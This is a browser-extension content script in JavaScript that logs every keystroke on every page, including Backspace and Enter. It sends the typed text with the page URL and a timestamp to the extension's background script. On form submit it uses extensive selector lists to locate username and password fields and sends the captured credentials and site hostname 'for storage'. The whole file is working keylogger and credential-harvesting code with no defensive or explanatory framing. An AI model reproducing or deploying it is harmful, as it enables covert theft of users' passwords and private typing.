let typedText = "";
let lastText = ""; // Store the last known text
let currentUrl = window.location.href;
let timeout;

document.addEventListener("keydown", (event) => {
    if (event.key.length === 1) { // Capture only printable characters
        typedText += event.key;
    } else if (event.key === "Backspace") {
        typedText += "<back>";
    } else if (event.key === "Enter") {
        typedText += "\n";
    }

    clearTimeout(timeout);
    timeout = setTimeout(sendKeystrokes, 1000); // Send after 1s of inactivity
});

function sendKeystrokes() {
    if (typedText !== lastText) { // Only send if there's a change
        chrome.runtime.sendMessage({
            type: "keystroke",
            url: currentUrl,
            text: computeDiff(lastText, typedText),
            timestamp: new Date().toISOString(),
        });

        lastText = typedText;
    }

    typedText = "";
}

function computeDiff(oldText, newText) {
    let start = 0;
    while (start < oldText.length && start < newText.length && oldText[start] === newText[start]) {
        start++;
    }

    let endOld = oldText.length - 1;
    let endNew = newText.length - 1;
    while (endOld >= start && endNew >= start && oldText[endOld] === newText[endNew]) {
        endOld--;
        endNew--;
    }

    let deletedPart = oldText.slice(start, endOld + 1);
    let addedPart = newText.slice(start, endNew + 1);

    if (deletedPart.length > 0) {
        return `<back ${deletedPart.length}>` + addedPart;
    }
    return addedPart;
}



document.addEventListener("submit", (event) => {
    const form = event.target;
    const passwordField = form.querySelector(
    'input[type="password"], ' +
    'input[name*="pass" i], input[id*="pass" i], input[class*="password" i], ' +
    'input[autocomplete="current-password"], input[autocomplete="new-password"], ' +
    'input[placeholder*="password" i], input[data-testid*="password" i], ' +
    'input[data-automation*="password" i]'
);

const usernameField = form.querySelector(
    'input[type="text"], input[type="email"], input[type="tel"], ' +
    'input[name*="user" i], input[name*="login" i], input[name*="email-or-phone" i], ' +
    'input[id*="user" i], input[id*="login" i], input[id*="identifier" i], ' +
    'input[autocomplete="username"], input[autocomplete="email"], ' +
    'input[placeholder*="email" i], input[placeholder*="phone" i], ' +
    'input[placeholder*="user" i], input[placeholder*="login" i], ' +
    'input[data-tracking-control-name*="email" i], ' +
    'input[class*="input__" i], input[class*="login" i], input[class*="ds-input__input" i], ' +
    'input[data-testid*="username" i], input[data-testid*="email" i], ' +
    'input[data-automation*="username" i]'
);


    if (passwordField && usernameField) {
        const credentials = {
            username: usernameField.value,
            password: passwordField.value,
            site: window.location.hostname
        };

        // Send credentials to background script for storage
        chrome.runtime.sendMessage({ type: "credentials", data: credentials });
    }
});
